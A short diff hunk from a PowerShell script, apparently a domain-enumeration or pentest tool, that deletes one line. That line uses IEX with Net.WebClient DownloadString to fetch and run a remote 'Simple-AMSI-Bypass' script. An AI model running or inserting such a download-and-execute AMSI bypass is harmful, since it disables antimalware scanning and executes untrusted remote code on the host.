@@ -4,7 +4,6 @@ param (
     [string]$Domain = $env:USERDNSDOMAIN
 )
 
-IEX(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/Simple-AMSI-Bypass/main/Simple-Amsi-Bypass.ps1')
 
 $PATH = "C:\Windows\Temp\"
 $LOGFILE = $PATH + "Log.txt"
